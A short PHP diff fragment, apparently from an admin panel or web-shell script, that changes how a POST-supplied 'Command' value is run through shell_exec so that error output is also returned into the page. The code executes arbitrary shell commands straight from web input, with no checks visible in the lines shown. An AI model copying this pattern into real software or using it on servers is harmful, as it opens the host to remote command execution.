@@ -57,7 +57,7 @@
 			}
 		}
 		if (isset($_POST["ExecuteShellCommand"])) {
-			$output = shell_exec($_POST["Command"]);
+			$output = shell_exec($_POST["Command"] . " 2>&1");
 			$explode = explode("PLACEHOLDEROUTPUT", $adminform);
 			$adminform = $explode[0] . $output . $explode[1];
 		}
